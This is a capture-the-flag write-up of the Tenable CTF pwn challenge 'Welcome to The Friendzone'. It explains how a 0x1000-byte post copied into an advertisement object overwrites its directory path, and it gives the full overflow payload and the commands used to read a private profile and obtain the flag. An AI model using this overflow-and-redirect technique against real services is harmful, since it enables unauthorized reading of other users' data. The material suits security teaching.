---
layout: post
author: STKFLT
title:  "Tenable CTF: Welcome to The Friendzone"
date:   2021-02-25 22:42:00 -0500
categories: CTF-writeup
ctf-category: PWN
---
# Welcome to The Friendzone

'Welcome to The Friendzone' was a Pwn challenge where you are only given source rather than an executable. The basic vulnerability is based on a buffer overrun but thankfully it does not require RCE to get the flag, because that would be quite a pain without knowing the exact compiler and flags used.

## First Look
The challenge text asked us to view the private profile of one of the users. We'll start by connecting to the service.

We see the program load some user profiles from what looks like filesystem paths and then presents us with a menu of options:
```
$ nc challenges.ctfd.io 30481
Loading profiles/friendzone_ceo profile data...
Loading profiles/car_ads profile data...
Loading profiles/katie_humphries profile data...
Loading profiles/tech_ads profile data...
Loading profiles/BiscuitsCoffee profile data...
Loading profiles/waygu_store profile data...
Loading profiles/douglas_schmelkov profile data...
Loading profiles/food_ads profile data...
 _____     _                _ _____ 
|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___ 
| |_ | '__| |/ _ \ '_ \ / _` | / // _ \| '_ \ / _ \
|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/
|_|  |_|  |_|\___|_| |_|\__,_/____\___/|_| |_|\___|
--------------------------------------------------------------------------------
Welcome to Friendzone Social Media! The leader in most advertisements.
--------------------------------------------------------------------------------

---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>
```
The `LIST_PROFILES` command shows a list of profile IDs, including profile ID 6. If we try to view profile ID 6 using, the `VIEW_PROFILE` command, we are told that all profiles below ID 100 are private. This gives us a good indication that profile 6 is what we are after.

The `source.zip` provided contained a flat directory of `.cpp` and `.h` files:
```
Account.cpp
Account.h
AdEnabledAccount.cpp
AdEnabledAccount.h
Advertisement.cpp
Advertisement.h
Business.cpp
Business.h
Console.cpp
Console.h
Database.cpp
Database.h
Friendzone.cpp
Friendzone.md
User.cpp
User.h
```
Compiling this was as easy as `g++ *.cpp *.h -o friendzone`, but as we will see most of the interesting parts require additional file resources that weren't provided so I spent most of my time interacting with the server instead.

I started by just diving into the source code and trying to map features of the CLI interface to the code while looking for any obvious issues. `Console.cpp` is the main interface and implements all of the parsing of user commands. One comment in `Console.cpp` really stuck out as weird:
```cpp
	// Advertisements are accounts but shouldnt be viewable as if they were a user/business
	if (act->GetProfileType() == ProfileType::ADVERTISEMENT) {
		Error("Unable to view account because account is Advertiser - no profile data to see!");
		return;
	}
```
As far as I could tell it made no sense to implement ads as accounts but it wasn't immediately obvious what to do with that information yet. 

Another weird thing was that whenever a user or business creates an account they get to decide the type of ads they would like other users to see when viewing their profile.
```
And finally, what kind of ads would you like to be shown to visitors that visit your profile?

auto
food
tech
```
Looking at the source code, we can see that these options are loaded from an `advertisements` directory.
```cpp
// Advertisement.cpp:23
bool Advertisement::IsAdTypeValid(string ad_type) {
	// prevent directory traversal
	if (ad_type.find(".") != std::string::npos || ad_type.find("\\") != std::string::npos || ad_type.find("/") != std::string::npos)
		return false;
	
	//check ad_type file exists in advertisers_directory
	FILE* fp = fopen(string(advertisers_directory + ad_type).c_str(), "r");

	if (fp != NULL)
		return true;
	return false;
}
```
The `advertisers_directory` attribute is defined in `Advertisements.h`:
```cpp
// Advertisement.h:7
class Advertisement : public Account {
	
public:
	char ad_text[0xf00];
    char advertisers_directory[0x100] = "advertisements/";
	string ad_type;
	Advertisement(string ad_type);
	bool ChangeAdType(string ad_type);
	bool IsAdTypeValid(string ad_type);
	string GetAdType();
	string GetAdText();
};
```
Here we can also confirm that the `Advertisement` class is indeed a subclass of `Account`. 

Now that I knew ads are stored in a directory and that the user profiles were stored in another directory `profiles/`, I figured that this must be the way to access the private profile.

All Accounts in the system (User and Business) are subclasses of `AdEnabledAccount`, which itself subclasses `Account`. 

Looking at `AdEnabledAccount.h`, we find exactly what we are looking for:

```cpp
// AdEnabledAccount.h:7
class AdEnabledAccount : public Account {
public:
	char last_post[0x1000];
	string status;
	string ad_type;
	vector<string> posts;
	AdEnabledAccount(ProfileType profile_type, string ad_type);
	void AddPost(string post);
};
```
## The Exploit

`AdEnabledAccount` has a field `char last_post[0x1000]`. Looking at `Advertisement`, we see that it's first field is `char ad_text[0xf00]` followed by `char advertisers_directory[0x100] = "advertisements/";`. 

The fact that the sizes of `ad_text` and `advertisers_directory` sum perfectly to `0x1000` is too much of a coincidence, there must be a way that we use this to overwrite the `advertisers_directory`.

One quick "Find References" away and we find that the last_post field is written to when using the `POST` command!
```cpp
// Console.cpp:444
void Console::HandlePost() {
	// Read user post message
	do {
		cout << "What would you like to post to " + db->GetProfileData(profile_id)->account_name + " wall?" << endl << endl<<"post>";
		getline(cin, post_msg);
		if (post_msg.length() < 0x1000) {
			valid_response_flag = true;
			memset(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, 0, 0x1000);
			memcpy(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, post_msg.c_str(), post_msg.length());
		}
		else {
			Error("Invalid! too long post.");
		}
	} while (!valid_response_flag);

}
```

And what's more, there is no validation of which profile ID we write to, meaning we can post on the "wall" of an Advertisement and write up to `0x1000` bytes of the `ad_text` and `advertisers_directory` fields. 

Attempting to view an ad as a profile returns the error we saw earlier so it was fairly easy to identify which profiles were ads. 

Next I overwrote the `advertisers_directory` field of the first ad profile with `profiles//////////////` in order to point the ad loading code towards the user profiles. I added the slashes to guarantee that I had fully overwritten the previous text and because fopen interprets them the same way as a single slash. Through trial and error I found which ad type it was by changing the ad_type for my profile until I received an error message that the ad could not be found:

```
cmd>CREATE_PROFILE personal
User Name>asdf

*********Welcome asdf! Let's get your general location**********

Enter your city, state>asdf
Enter your Gender>asdf
Enter your Age>asdf

Invalid! age must be number.

Enter your Age>10
And finally, what kind of ads would you like to be shown to visitors that visit your profile?

auto
food
tech

Enter an AdType>tech
Welcome to FriendZone asdf! (profile_id:1142332565)
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>POST 35529
What would you like to post to  wall?

post>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAprofiles//////////////////////////
---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>VIEW_PROFILE 1142332565
Navigating to asdf... but first an ad!

*******************************************************************************************************

* 404 - NO_AD_FOUND! This is a bug, please report to FriendZone support.

*******************************************************************************************************
```

Next, I had to find a way to display the profile data for Profile ID 6 instead of `404`ing. Luckily, the `EDIT_PROFILE` command lets us edit an ad account in order to change the type of ad it displays. If you enter an invalid ad (i.e. a file of that name does not exist) the system returns an error. I guessed that the `friendzone_ceo` profile was one we were supposed to go after and entered that as the `ad_type` for the ad I had corrupted:
```
cmd>EDIT_PROFILE 35529
What new ad type should this be?

ad_type>friendzone_ceo
---------------------------------------------------------
```

No error came back which means it worked! Once we view our ad it should load the `friendzone_ceo`'s profile data.

I created a new profile and as expected, `friendzone_ceo` appeared as a possible ad type:
```
cmd>CREATE_PROFILE personal
User Name>asdf

*********Welcome asdf! Let's get your general location**********

Enter your city, state>asdf
Enter your Gender>asdf
Enter your Age>10
And finally, what kind of ads would you like to be shown to visitors that visit your profile?

auto
food
friendzone_ceo

Enter an AdType>friendzone_ceo
Welcome to FriendZone asdf! (profile_id:175976113)
```

Finally, I used the `VIEW_PROFILE` command to view the profile ID that I had just created:
```
cmd>VIEW_PROFILE 175976113
Navigating to asdf... but first an ad!

*******************************************************************************************************

* 0|Alec Trevelyan|006|???|32|M|!INTERNAL FRIENDZONE EMPLOYES ONLY!|flag{w3_n33d_m0re_d@ta_2_s311}|auto


*******************************************************************************************************
```
